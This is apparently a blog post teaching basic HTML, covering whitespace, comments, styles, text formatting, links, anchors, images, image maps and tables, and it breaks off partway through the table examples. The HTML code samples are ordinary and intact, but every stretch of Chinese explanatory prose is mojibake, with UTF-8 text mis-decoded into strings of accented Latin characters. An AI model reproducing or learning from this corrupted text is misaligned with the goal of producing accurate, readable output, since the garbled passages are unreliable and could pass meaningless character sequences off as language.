paragraph with line breaks --- æ˜¾ç¤ºé¡µé¢æ—¶ï¼Œæµè§ˆå™¨ä¼šç§»é™¤æºä»£ç ä¸­å¤šä½™çš„ç©ºæ ¼å’Œç©ºè¡Œã€‚æ‰€æœ‰è¿ç»­çš„ç©ºæ ¼æˆ–ç©ºè¡Œéƒ½ä¼šè¢«ç®—ä½œä¸€ä¸ªç©ºæ ¼ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒHTML ä»£ç ä¸­çš„æ‰€æœ‰è¿ç»­çš„ç©ºè¡Œï¼ˆæ¢è¡Œï¼‰ä¹Ÿè¢«æ˜¾ç¤ºä¸ºä¸€ä¸ªç©ºæ ¼ã€‚æ¯”å¦‚ï¼š &lt;p&gt; æ˜¥çœ ä¸è§‰æ™“ï¼Œ å¤„å¤„é—»å•¼é¸Ÿã€‚ å¤œæ¥é£é›¨å£°ï¼Œ èŠ±è½çŸ¥å¤šå°‘ã€‚ &lt;/p&gt; æ˜¥çœ ä¸è§‰æ™“ï¼Œ å¤„å¤„é—»å•¼é¸Ÿã€‚ å¤œæ¥é£é›¨å£°ï¼Œ èŠ±è½çŸ¥å¤šå°‘ã€‚ æ³¨é‡Š&lt;!-- This is a comment --&gt; æ¡ä»¶æ³¨é‡Šæ¡ä»¶æ³¨é‡Šå®šä¹‰åªæœ‰ Internet Explorer æ‰§è¡Œçš„ HTML æ ‡ç­¾ã€‚ &lt;!--[if lt IE 9]&gt; &lt;script src=\"http://html5shiv.googlecode.com/svn/trunk/html5.js\"&gt;&lt;/script&gt; &lt;![endif]--&gt; æ ·å¼&lt;style&gt; æ ‡ç­¾ç”¨äºä¸º HTML æ–‡æ¡£å®šä¹‰æ ·å¼ä¿¡æ¯ã€‚ &lt;p style=\"font-family:verdana;color:red\"&gt; This text is in Verdana and red&lt;/p&gt; &lt;p style=\"font-family:times;color:green\"&gt; This text is in Times and green&lt;/p&gt; &lt;p style=\"font-size:30px\"&gt;This text is 30 pixels high&lt;/p&gt; This text is in Verdana and red This text is in Times and green This text is 30 pixels high ä¸‹é¢æ˜¯ä¸€äº›å®ä¾‹ï¼Œæ›´å¤šå…³äºæ ·å¼çš„éœ€è¦çœ‹ **CSSæ•™ç¨‹** æ¥ç€ï¼ˆï¼ˆ èƒŒæ™¯é¢œè‰²bgcolor å±æ€§å·²ç»å¼ƒç”¨äº†ï¼Œè¦ç”¨background-colorã€‚ &lt;p style=\"background-color:blue\"&gt;This is a paragraph.&lt;/p&gt; This is a paragraph. å­—ä½“ã€é¢œè‰²å’Œå°ºå¯¸style å±æ€§æ·˜æ±°äº†æ—§çš„ &lt;font&gt; æ ‡ç­¾ã€‚ &lt;p style=\"font-family:arial;color:red;font-size:25px;\"&gt;A paragraph.&lt;/p&gt; A paragraph. æ–‡æœ¬å¯¹é½ä½¿ç”¨text-alignå±æ€§ style å±æ€§æ·˜æ±°äº†æ—§çš„ align å±æ€§ã€‚ &lt;p style=\"text-align:left\"&gt;é å·¦å¯¹é½&lt;/p&gt; &lt;p style=\"text-align:center\"&gt;å±…ä¸­å¯¹é½&lt;/p&gt; &lt;p style=\"text-align:right\"&gt;é å³å¯¹é½&lt;/p&gt; é å·¦å¯¹é½ å±…ä¸­å¯¹é½ é å³å¯¹é½ æ–‡æœ¬æ ¼å¼åŒ–å®šä¹‰å¾ˆå¤šä¾›æ ¼å¼åŒ–è¾“å‡ºçš„å…ƒç´ ï¼Œæ¯”å¦‚ç²—ä½“å’Œæ–œä½“å­—ã€‚ æ ¼å¼åŒ–å»ºè®®ç”¨strongã€emè¿™ç±»åŸºäºå†…å®¹çš„æ ·å¼ï¼ˆcontent-based styleï¼‰æ¥ä»£æ›¿bã€iè¿™ç±»ç‰©ç†æ ·å¼ï¼ˆphysical styleï¼‰ï¼Œæ›´èƒ½è¯­ä¹‰åŒ–ã€‚ è¯¦è§è¿™é‡Œï¼šHTML æ•™ç¨‹å»¶ä¼¸é˜…è¯»ï¼šæ”¹å˜æ–‡æœ¬çš„å¤–è§‚å’Œå«ä¹‰ &lt;b&gt;This text is bold&lt;/b&gt; &lt;strong&gt;This text is strong&lt;/strong&gt; &lt;big&gt;This text is big&lt;/big&gt; &lt;em&gt;This text is emphasized&lt;/em&gt; &lt;i&gt;This text is italic&lt;/i&gt; &lt;small&gt;This text is small&lt;/small&gt; This text contains &lt;sub&gt;subscriptä¸‹æ ‡&lt;/sub&gt; This text contains &lt;sup&gt;superscriptä¸Šæ ‡&lt;/sup&gt; This text is bold This text is strong This text is big This text is emphasized This text is italic This text is small This text containssubscriptä¸‹æ ‡ This text containssuperscriptä¸Šæ ‡ é¢„æ ¼å¼æ–‡æœ¬&lt;pre&gt;æ ‡ç­¾ &lt;pre&gt; è¿™æ˜¯ é¢„æ ¼å¼æ–‡æœ¬ã€‚ å®ƒä¿ç•™äº† ç©ºæ ¼ å’Œæ¢è¡Œã€‚ &lt;/pre&gt; &lt;pre&gt; for i in range(1,10): print(i) &lt;/pre&gt; è¿™æ˜¯ é¢„æ ¼å¼æ–‡æœ¬ã€‚ å®ƒä¿ç•™äº† ç©ºæ ¼ å’Œæ¢è¡Œã€‚ pre æ ‡ç­¾å¾ˆé€‚åˆæ˜¾ç¤ºè®¡ç®—æœºä»£ç ï¼šï¼ˆå¯ä»¥å…ˆç”¨preå†ç”¨codeæ ‡ç­¾ for i in range(1,10): print(i) è®¡ç®—æœº/ç¼–ç¨‹ä»£ç è¿™äº›æ ‡ç­¾å¸¸ç”¨äºæ˜¾ç¤ºè®¡ç®—æœº/ç¼–ç¨‹ä»£ç â†“ã€‚ &lt;code&gt;Computer code&lt;/code&gt; &lt;kbd&gt;Keyboard input&lt;/kbd&gt; &lt;tt&gt;Teletype text&lt;/tt&gt; &lt;samp&gt;Sample text&lt;/samp&gt; &lt;var&gt;Computer variable&lt;/var&gt; Computer code Keyboard input Teletype text Sample text Computer variable åœ°å€address &lt;address&gt; Written by &lt;a href=\"https://miaotony.xyz\"&gt;MiaoTony&lt;/a&gt;.&lt;br /&gt; Visit me at:&lt;br /&gt; miaotony.xyz&lt;br /&gt; MeowBox &lt;/address&gt; Written by MiaoTony. Visit me at: miaotony.xyz MeowBox ç¼©å†™å’Œé¦–å­—æ¯ç¼©å†™åœ¨æŸäº›æµè§ˆå™¨ä¸­ï¼Œå½“æŠŠé¼ æ ‡ç§»è‡³ç¼©ç•¥è¯è¯­ä¸Šæ—¶ï¼Œtitle å¯ç”¨äºå±•ç¤ºè¡¨è¾¾çš„å®Œæ•´ç‰ˆæœ¬ã€‚ &lt;abbr&gt;å®šä¹‰ç¼©å†™ï¼Œ&lt;acronym&gt; å®šä¹‰é¦–å­—æ¯ç¼©å†™ã€‚ &lt;abbr title=\"etcetera\"&gt;etc.&lt;/abbr&gt; &lt;acronym title=\"World Wide Web\"&gt;WWW&lt;/acronym&gt; etc.WWW æ–‡å­—æ–¹å‘ï¼ˆåŒå‘é‡å†™ï¼‰è‹¥æµè§ˆå™¨æ”¯æŒåŒæµå‘è¦†ç›– bi-directional override (bdo)ï¼Œ&lt;bdo&gt;å…ƒç´ ç”¨äºè¦†ç›–å½“å‰æ–‡æœ¬æ–¹å‘ï¼Œåˆ™ä¸‹é¢è¿™ä¸€è¡Œä¼šä»å³å‘å·¦è¾“å‡º (rtl)ã€‚ &lt;bdo dir=\"rtl\"&gt; Here is some Hebrew text &lt;/bdo&gt; Here is some Hebrew text å¼•ç”¨ä½¿ç”¨ blockquote å…ƒç´ çš„è¯ï¼Œæµè§ˆå™¨ä¼šæ’å…¥æ¢è¡Œå’Œå¤–è¾¹è·ï¼Œè€Œ q å…ƒç´ ä¸ä¼šæœ‰ä»»ä½•ç‰¹æ®Šçš„å‘ˆç°ï¼ˆåªæ˜¯åŠ ä¸€ä¸ªå¼•å·ï¼‰ã€‚ è¿™æ˜¯é•¿çš„å¼•ç”¨ï¼š &lt;blockquote&gt; è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚ &lt;/blockquote&gt; è¿™æ˜¯çŸ­çš„å¼•ç”¨ï¼š &lt;q&gt;è¿™æ˜¯çŸ­çš„å¼•ç”¨ã€‚&lt;/q&gt; è¿™æ˜¯é•¿çš„å¼•ç”¨ï¼š è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚ è¿™æ˜¯çŸ­çš„å¼•ç”¨ï¼šè¿™æ˜¯çŸ­çš„å¼•ç”¨ã€‚ åˆ é™¤çº¿ &amp; æ’å…¥çº¿å¤§å¤šæ•°æµè§ˆå™¨ä¼šæ”¹å†™ä¸ºåˆ é™¤æ–‡æœ¬å’Œä¸‹åˆ’çº¿æ–‡æœ¬ã€‚ ä¸€äº›è€å¼çš„æµè§ˆå™¨ä¼šæŠŠåˆ é™¤æ–‡æœ¬å’Œä¸‹åˆ’çº¿æ–‡æœ¬æ˜¾ç¤ºä¸ºæ™®é€šæ–‡æœ¬ã€‚ &lt;p&gt;ä¸€æ‰“æœ‰ &lt;del&gt;äºŒå&lt;/del&gt; &lt;ins&gt;åäºŒ&lt;/ins&gt; ä»¶ã€‚&lt;/p&gt; ä¸€æ‰“æœ‰ äºŒå åäºŒ ä»¶ã€‚ å®šä¹‰ HTML5 æ ‡å‡†ï¼š å¦‚æœè®¾ç½®äº† &lt;dfn&gt; å…ƒç´ çš„ title å±æ€§ï¼Œåˆ™å®šä¹‰é¡¹ç›®ï¼š &lt;p&gt;The &lt;dfn title=\"World Health Organization\"&gt;WHO&lt;/dfn&gt; was founded in 1948.&lt;/p&gt; The WHO was founded in 1948. å¦‚æœ &lt;dfn&gt; å…ƒç´ åŒ…å«å…·æœ‰æ ‡é¢˜çš„ &lt;abbr&gt; å…ƒç´ ï¼Œåˆ™ title å®šä¹‰é¡¹ç›®ï¼š &lt;p&gt;The &lt;dfn&gt;&lt;abbr title=\"World Health Organization\"&gt;WHO&lt;/abbr&gt;&lt;/dfn&gt; was founded in 1948. &lt;/p&gt; The WHO was founded in 1948. å¦åˆ™ï¼Œ&lt;dfn&gt; æ–‡æœ¬å†…å®¹å³æ˜¯é¡¹ç›®ï¼Œå¹¶ä¸”çˆ¶å…ƒç´ åŒ…å«å®šä¹‰ã€‚ &lt;p&gt;&lt;dfn&gt;WHO&lt;/dfn&gt; World Health Organization æˆç«‹äº 1948 å¹´ã€‚&lt;/p&gt; WHO World Health Organization æˆç«‹äº 1948 å¹´ã€‚ è‹¥å¸Œæœ›ç®€è€ŒåŒ–ä¹‹ï¼Œè¯·ä½¿ç”¨ç¬¬ä¸€æ¡ï¼Œæˆ–ä½¿ç”¨ &lt;abbr&gt; ä»£æ›¿ã€‚ è‘—ä½œæ ‡é¢˜æµè§ˆå™¨é€šå¸¸ä»¥æ–œä½“æ¥æ˜¾ç¤ºã€‚ &lt;p&gt;&lt;cite&gt;The Scream&lt;/cite&gt; by Edward Munch. Painted in 1893.&lt;/p&gt; The Scream by Edward Munch. Painted in 1893. è®¡ç®—æœºä»£ç &lt;code&gt; å…ƒç´ ä¸ä¿ç•™å¤šä½™çš„ç©ºæ ¼å’ŒæŠ˜è¡Œã€‚ &lt;code&gt; var person = { firstName:\"Bill\", lastName:\"Gates\", age:50, eyeColor:\"blue\" } &lt;/code&gt; var person = { firstName:\"Bill\", lastName:\"Gates\", age:50, eyeColor:\"blue\" } éœ€è§£å†³è¯¥é—®é¢˜ï¼Œå¿…é¡»åœ¨ &lt;pre&gt; å…ƒç´ ä¸­åŒ…å›´ä»£ç  &lt;code&gt; &lt;pre&gt; var person = { firstName:\"Bill\", lastName:\"Gates\", age:50, eyeColor:\"blue\" } &lt;/pre&gt; &lt;/code&gt; var person = { firstName:\"Bill\", lastName:\"Gates\", age:50, eyeColor:\"blue\" } ä¹Ÿå¯ä»¥codeå’Œpreåè¿‡æ¥ã€‚ CSS æ ·å¼çš„å¼•ç”¨å¤–éƒ¨æ ·å¼è¡¨&lt;head&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"mystyle.css\"&gt; &lt;/head&gt; å†…éƒ¨æ ·å¼è¡¨&lt;head&gt; &lt;style type=\"text/css\"&gt; body {background-color: red} p {margin-left: 20px} &lt;/style&gt; &lt;/head&gt; å†…è”æ ·å¼&lt;p style=\"color: red; margin-left: 20px\"&gt; This is a paragraph &lt;/p&gt; ä¼˜å…ˆçº§æ˜¯ å†…è”æ ·å¼&gt;å†…éƒ¨æ ·å¼è¡¨&gt;å¤–éƒ¨æ ·å¼è¡¨ã€‚ é“¾æ¥&lt;a href=\"https://miaotony.xyz\"&gt;MiaoTony's blog&lt;/a&gt; MiaoTonyâ€™s blog â€œé“¾æ¥æ–‡æœ¬â€ ä¸å¿…ä¸€å®šæ˜¯æ–‡æœ¬ã€‚å›¾ç‰‡æˆ–å…¶ä»– HTML å…ƒç´ éƒ½å¯ä»¥æˆä¸ºé“¾æ¥ã€‚ è¿™æ˜¯å¦ä¸€ä¸ª mailto é“¾æ¥ï¼š &lt;p&gt;&lt;a href=\"mailto:someone@microsoft.com?cc=someoneelse@microsoft.com&amp;bcc=andsomeoneelse2@microsoft.com&amp;subject=Summer%20Party&amp;body=You%20are%20invited%20to%20a%20big%20summer%20party!\"&gt;å‘é€é‚®ä»¶ï¼&lt;/a&gt; &lt;/p&gt; å‘é€é‚®ä»¶ï¼ target å±æ€§Target å±æ€§å¯ä»¥å®šä¹‰è¢«é“¾æ¥çš„æ–‡æ¡£åœ¨ä½•å¤„æ˜¾ç¤ºã€‚ åœ¨æ–°çª—å£æ‰“å¼€ï¼š &lt;a href=\"https://miaotony.xyz\" target=\"_blank\"&gt;MiaoTony's blog&lt;/a&gt; MiaoTonyâ€™s blog è·³å‡ºé¡µé¢æ¡†æ¶ï¼š &lt;a href=\"https://miaotony.xyz\" target=\"_top\"&gt;MiaoTony's blog&lt;/a&gt; MiaoTonyâ€™s blog ï¼ˆåœ¨hexoéƒ¨ç½²çš„æ—¶å€™ï¼Œå¥½åƒæŠŠæ‰€æœ‰çš„targetéƒ½æ”¹æˆ â€œ_blankâ€ äº† emmm name å±æ€§nameå±æ€§è§„å®šé”šï¼ˆanchorï¼‰çš„åç§°ã€‚å¯ä»¥ä½¿ç”¨ name å±æ€§åˆ›å»º HTML é¡µé¢ä¸­çš„ä¹¦ç­¾ã€‚ å½“ä½¿ç”¨å‘½åé”šï¼ˆnamed anchorsï¼‰æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºç›´æ¥è·³è‡³è¯¥å‘½åé”šï¼ˆæ¯”å¦‚é¡µé¢ä¸­æŸä¸ªå°èŠ‚ï¼‰çš„é“¾æ¥ã€‚ é¦–å…ˆå¯¹é”šè¿›è¡Œå‘½åï¼Œæˆ–è€…è¯´åˆ›å»ºä¸€ä¸ªä¹¦ç­¾â€”â€” &lt;a name=\"label123\"&gt;é”šï¼ˆæ˜¾ç¤ºåœ¨é¡µé¢ä¸Šçš„æ–‡æœ¬ï¼‰&lt;/a&gt; é”šï¼ˆæ˜¾ç¤ºåœ¨é¡µé¢ä¸Šçš„æ–‡æœ¬ï¼‰ ä¹Ÿå¯ä»¥ä½¿ç”¨ id å±æ€§æ¥æ›¿ä»£ name å±æ€§ã€‚ ç„¶ååœ¨åŒä¸€ä¸ªæ–‡æ¡£ä¸­åˆ›å»ºæŒ‡å‘è¯¥é”šçš„é“¾æ¥ï¼Œæˆ–åœ¨å…¶ä»–é¡µé¢æŒ‡å‘è¯¥é”šï¼Œå³å¯è·³è½¬åˆ°è¿™ä¸ªé”šç‚¹çš„ä½ç½®ã€‚ å°† # ç¬¦å·å’Œé”šåç§°æ·»åŠ åˆ° URL çš„æœ«ç«¯ï¼Œå°±å¯ä»¥ç›´æ¥é“¾æ¥åˆ° tips è¿™ä¸ªå‘½åé”šäº†ã€‚ &lt;a href=\"#tips\" target=\"_self\"&gt;è·³è½¬åˆ°ä¸Šé¢çš„é”šç‚¹&lt;/a&gt; è·³è½¬åˆ°ä¸Šé¢çš„é”šç‚¹ å‡å¦‚æµè§ˆå™¨æ‰¾ä¸åˆ°å·²å®šä¹‰çš„å‘½åé”šï¼Œé‚£ä¹ˆå°±ä¼šå®šä½åˆ°æ–‡æ¡£çš„é¡¶ç«¯ã€‚ä¸ä¼šæœ‰é”™è¯¯å‘ç”Ÿã€‚ å›¾åƒç©ºæ ‡ç­¾ï¼ŒåªåŒ…å«å±æ€§ï¼Œå¹¶ä¸”æ²¡æœ‰é—­åˆæ ‡ç­¾ã€‚ &lt;img src=\"url\" /&gt; æ›¿ä»£æ–‡æœ¬ alt å±æ€§åœ¨æµè§ˆå™¨æ— æ³•è½½å…¥å›¾åƒæ—¶ï¼ˆå›¾è£‚äº†ï¼‰ï¼Œæ›¿æ¢æ–‡æœ¬å±æ€§å°†è¢«ç”¨æ¥æ˜¾ç¤ºå¤±å»çš„ä¿¡æ¯ã€‚ &lt;img src=\"cat.gif\" alt=\"A cat\"&gt; å°±åƒè¿™æ ·ï¼š å›¾åƒèƒŒæ™¯&lt;body background=\"/background.jpg\"&gt; å¦‚æœå›¾åƒå°äºé¡µé¢ï¼Œå›¾åƒä¼šè¿›è¡Œé‡å¤ã€‚ å›¾åƒå¯¹é½&lt;h2&gt;æœªè®¾ç½®å¯¹é½æ–¹å¼çš„å›¾åƒï¼š&lt;/h2&gt; &lt;p&gt;å›¾åƒ &lt;img src =\"pic.jpg\"&gt; åœ¨æ–‡æœ¬ä¸­&lt;/p&gt; &lt;h2&gt;å·²è®¾ç½®å¯¹é½æ–¹å¼çš„å›¾åƒï¼š&lt;/h2&gt; &lt;p&gt;å›¾åƒ &lt;img src=\"pic.jpg\" align=\"bottom\"&gt; åœ¨æ–‡æœ¬ä¸­&lt;/p&gt; &lt;p&gt;å›¾åƒ &lt;img src =\"pic.jpg\" align=\"middle\"&gt; åœ¨æ–‡æœ¬ä¸­&lt;/p&gt; &lt;p&gt;å›¾åƒ &lt;img src =\"pic.jpg\" align=\"top\"&gt; åœ¨æ–‡æœ¬ä¸­&lt;/p&gt; bottom å¯¹é½æ–¹å¼æ˜¯é»˜è®¤çš„å¯¹é½æ–¹å¼ã€‚ æµ®åŠ¨å›¾åƒ&lt;p&gt; &lt;img src =\"/i/eg_cute.gif\" align =\"left\"&gt; å¸¦æœ‰å›¾åƒçš„ä¸€ä¸ªæ®µè½ã€‚å›¾åƒçš„ align å±æ€§è®¾ç½®ä¸º \"left\"ã€‚å›¾åƒå°†æµ®åŠ¨åˆ°æ–‡æœ¬çš„å·¦ä¾§ã€‚ &lt;/p&gt; &lt;p&gt; &lt;img src =\"/i/eg_cute.gif\" align =\"right\"&gt; å¸¦æœ‰å›¾åƒçš„ä¸€ä¸ªæ®µè½ã€‚å›¾åƒçš„ align å±æ€§è®¾ç½®ä¸º \"right\"ã€‚å›¾åƒå°†æµ®åŠ¨åˆ°æ–‡æœ¬çš„å³ä¾§ã€‚ &lt;/p&gt; å›¾åƒå°ºå¯¸é€šè¿‡æ”¹å˜ img æ ‡ç­¾çš„ â€œheightâ€ å’Œ â€œwidthâ€ å±æ€§çš„å€¼ï¼Œå¯ä»¥æ”¾å¤§æˆ–ç¼©å°å›¾åƒã€‚ &lt;img src=\"/html5.jpg\" width=\"50\" height=\"50\"&gt; &lt;img src=\"/html5.jpg\" width=\"100\" height=\"100\"&gt; &lt;img src=\"/html5.jpg\" width=\"200\" height=\"200\"&gt; å›¾åƒé“¾æ¥å°†ä¸€ä¸ªå›¾åƒå½“ä½œé“¾æ¥ä½¿ç”¨ã€‚ &lt;a href=\"https://miaotony.xyz\"&gt;&lt;img src=\"/html5.jpg\" /&gt;&lt;/a&gt; æ¯”å¦‚ç‚¹ä¸€ç‚¹è¿™ä¸ªå°±åˆ°è¾¾æˆ‘çš„åšå®¢ä¸»é¡µäº†â†’ ï¼ˆæœ‰å¯èƒ½è¢«hexoä¼˜åŒ–æ‰emmm åˆ›å»ºå›¾åƒæ˜ å°„åˆ›å»ºå¸¦æœ‰å¯ä¾›ç‚¹å‡»åŒºåŸŸçš„å›¾åƒåœ°å›¾ã€‚å…¶ä¸­çš„æ¯ä¸ªåŒºåŸŸéƒ½æ˜¯ä¸€ä¸ªè¶…çº§é“¾æ¥ã€‚ img å…ƒç´ ä¸­çš„ â€œusemapâ€ å±æ€§å¼•ç”¨ map å…ƒç´ ä¸­çš„ â€œidâ€ æˆ– â€œnameâ€ å±æ€§ï¼ˆæ ¹æ®æµè§ˆå™¨ï¼‰ å›¾ç‰‡å·¦ä¸Šè§’åæ ‡ä¸º (0,0)ï¼Œå³ä¸‹è§’ä¸º (x,y)ï¼Œå·¦å¾€å³ä¸ºxè½´æ­£æ–¹å‘ï¼Œä¸Šå¾€ä¸‹ä¸ºyè½´æ­£æ–¹å‘ã€‚ &lt;img src=\"https://www.w3school.com.cn/i/eg_planets.jpg\" border=\"0\" usemap=\"#planetmap\" alt=\"Planets\" /&gt; &lt;map name=\"planetmap\" id=\"planetmap\"&gt; &lt;area shape=\"circle\" coords=\"180,139,14\" href =\"https://www.w3school.com.cn/example/html/venus.html\" target =\"_blank\" alt=\"Venus\" /&gt; &lt;area shape=\"circle\" coords=\"129,161,10\" href =\"https://www.w3school.com.cn/example/html/mercur.html\" target =\"_blank\" alt=\"Mercury\" /&gt; &lt;area shape=\"rect\" coords=\"0,0,110,260\" href =\"https://www.w3school.com.cn/example/html/sun.html\" target =\"_blank\" alt=\"Sun\" /&gt; &lt;/map&gt; å…¶ä¸­&lt;map&gt;ç”¨æ¥å®šä¹‰å›¾åƒåœ°å›¾ï¼Œ&lt;area&gt;ç”¨æ¥å®šä¹‰å›¾åƒåœ°å›¾ä¸­çš„å¯ç‚¹å‡»åŒºåŸŸã€‚ ç‚¹å‡»å¯¹åº”çš„åŒºåŸŸä¼šè·³è½¬åˆ°ä¸åŒçš„é¡µé¢ã€‚*ï¼ˆé“¾æ¥æœ‰å¯èƒ½è¢«hexoä¼˜åŒ–æ‰emmm*è¿˜æ˜¯å¯ä»¥ç‚¹çš„ å°†å›¾åƒè½¬æ¢ä¸ºå›¾åƒæ˜ å°„æŠŠä¸€å¹…æ™®é€šçš„å›¾åƒè®¾ç½®ä¸ºå›¾åƒæ˜ å°„ã€‚åŠ å…¥ismap å±æ€§ï¼Œå³å¯è·å¾—å›¾ç‰‡çš„åæ ‡ã€‚ &lt;a href=\"/html_ismap.html\"&gt; &lt;img src=\"/planets.jpg\" ismap /&gt; &lt;/a&gt; å¦‚æœç‚¹å‡» (12,34)ï¼Œåˆ™ä¼šè®¿é—®/html_ismap.html?12,34. è¡¨æ ¼æ¯ä¸ªè¡¨æ ¼ç”± table æ ‡ç­¾å¼€å§‹ã€‚æ¯ä¸ªè¡¨æ ¼è¡Œç”± tr æ ‡ç­¾ (table row) å¼€å§‹ã€‚æ¯ä¸ªè¡¨æ ¼æ•°æ®ç”± td æ ‡ç­¾ (table data) å¼€å§‹ï¼Œå³æ•°æ®å•å…ƒæ ¼çš„å†…å®¹ã€‚ æ•°æ®å•å…ƒæ ¼å¯ä»¥åŒ…å«æ–‡æœ¬ã€å›¾ç‰‡ã€åˆ—è¡¨ã€æ®µè½ã€è¡¨å•ã€æ°´å¹³çº¿ã€è¡¨æ ¼ç­‰ç­‰ã€‚ ï¼ˆè¿™é‡Œåœ¨åšå®¢ä¸Šå¯èƒ½å¾ˆå¤šæ˜¾ç¤ºä¸æ­£å¸¸ï¼Œå› ä¸ºå¦å¤–æœ‰CSSæ ·å¼å¯¹å…¨å±€è¡¨æ ¼è¿›è¡Œäº†å®šä¹‰ &lt;table&gt; &lt;tr&gt; &lt;td&gt;row 1, cell 1&lt;/td&gt; &lt;td&gt;row 1, cell 2&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;row 2, cell 1&lt;/td&gt; &lt;td&gt;row 2, cell 2&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; row 1, cell 1 row 1, cell 2 row 2, cell 1 row 2, cell 2 è¾¹æ¡†borderå±æ€§ ä¸Šé¢çš„ä¾‹å­æ²¡æœ‰è¾¹æ¡†ï¼Œæˆ–è€…è®¾ç½®&lt;table border=\"0\"&gt;ã€‚ å¸¦æœ‰æ™®é€šçš„è¾¹æ¡†ï¼š &lt;table border=\"1\"&gt; &lt;tr&gt; &lt;td&gt;First&lt;/td&gt; &lt;td&gt;Row&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Second&lt;/td&gt; &lt;td&gt;Row&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; First Row Second Row ç²—çš„è¾¹æ¡†ï¼ˆå¢å¤§borderï¼‰ï¼š &lt;table border=\"10\"&gt; First Row Second Row è¡¨å¤´thæ ‡ç­¾ å¤§å¤šæ•°æµè§ˆå™¨ä¼šæŠŠè¡¨å¤´æ˜¾ç¤ºä¸ºç²—ä½“å±…ä¸­çš„æ–‡æœ¬ &lt;table border=\"1\"&gt; &lt;tr&gt; &lt;th&gt;Heading&lt;/th&gt; &lt;th&gt;Another Heading&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;row 1, cell 1&lt;/td&gt; &lt;td&gt;row 1, cell 2&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;row 2, cell 1&lt;/td&gt; &lt;td&gt;row 2, cell 2&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; Heading Another Heading row 1, cell 1 row 1, cell 2 row 2, cell 1 row 2, cell 2 ä¸‹é¢æ˜¯å‚ç›´çš„è¡¨å¤´ï¼š &lt;table border=\"1\"&gt; &lt;tr&gt; &lt;th&gt;å§“å&lt;/th&gt; &lt;td&gt;Miao&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th&gt;ç”µè¯&lt;/th&gt; &lt;td&gt;123456&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th&gt;ç”µè¯&lt;/th&gt; &lt;td&gt;654321&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; å§“å Miao ç”µè¯ 123456 ç”µè¯ 654321 ç©ºå•å…ƒæ ¼&lt;table border=\"1\"&gt; &lt;tr&gt; &lt;td&gt;row 1, cell 1&lt;/td&gt; &lt;td&gt;row 1, cell 2&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;row 2, cell 2&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; row 1, cell 1 row 1, cell 2 row 2, cell 2 è¿™ä¸ªç©ºçš„å•å…ƒæ ¼çš„è¾¹æ¡†å¯èƒ½æ²¡æœ‰è¢«æ˜¾ç¤ºå‡ºæ¥ã€‚ä¸ºäº†é¿å…è¿™ç§æƒ…å†µï¼Œåœ¨ç©ºå•å…ƒæ ¼ä¸­æ·»åŠ ä¸€ä¸ªç©ºæ ¼å ä½ç¬¦ï¼ˆ&amp;nbsp;)ï¼Œå°±å¯ä»¥å°†è¾¹æ¡†æ˜¾ç¤ºå‡ºæ¥ã€‚ &lt;table border=\"1\"&gt; &lt;tr&gt; &lt;td&gt;row 1, cell 1&lt;/td&gt; &lt;td&gt;row 1, cell 2&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&amp;nbsp;&lt;/td&gt; &lt;td&gt;row 2, cell 2&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; row 1, cell 1 row 1, cell 2 &nbsp; row 2, cell 2 è¡¨çš„æ ‡é¢˜captionæ ‡ç­¾ &lt;table border=\"6\"&gt; &lt;caption&gt;è¿™æ˜¯æ ‡é¢˜&lt;/caption&gt; &lt;tr&gt; &lt;td&gt;100&lt;/td&gt; &lt;td&gt;200&lt;/td&gt; &lt;td&gt;300&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;400&lt;/td&gt; &lt;td&gt;500&lt;/td&gt; &lt;td&gt;600&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; è¿™æ˜¯æ ‡é¢˜ 100 200 300 400 500 600 å•å…ƒæ ¼è·¨è¡Œè·¨åˆ—æ¨ªè·¨åˆ—ï¼šcolspanå±æ€§ &lt;table border=\"1\"&gt; &lt;tr&gt; &lt;th&gt;å§“å&lt;/th&gt; &lt;th colspan=\"2\"&gt;ç”µè¯&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Miao&lt;/td&gt; &lt;td&gt;123456&lt;/td&gt; &lt;td&gt;654321&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; å§“å ç”µè¯ Miao 123456 654321 